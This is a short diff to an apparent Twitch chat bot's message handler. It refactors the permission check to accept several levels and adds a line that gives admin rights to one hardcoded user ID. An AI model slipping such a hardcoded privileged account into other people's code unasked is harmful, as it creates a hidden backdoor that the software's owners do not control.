@@ -23,6 +23,9 @@ module.exports = {
 		if (tags.mod) { perms.mod = true; }
 		if (tags.vip) { perms.vip = true; }
 		if (tags.subscriber) { perms.sub = true; }
+		if (tags['user-id'] == '90928645') {
+			perms.admin = true;
+		}
 
 		// Timestamp
 		const formattedTime = module.exports.timeConverter(tags['tmi-sent-ts']);
@@ -182,7 +185,13 @@ module.exports = {
 
 			// Handle perms/proceed, assign output if needed
 			if (action.perms) {
-				if (!perms[action.perms.levels]) {
+				let hasPerm = false;
+				for (const [key] of Object.entries(perms)) {
+					if (action.perms['levels'].includes(key)) {
+						hasPerm = true;
+					}
+				}
+				if (!hasPerm) {
 					output = `${tags.username}, ${action.perms.error}`;
 					proceed = false;
 				}
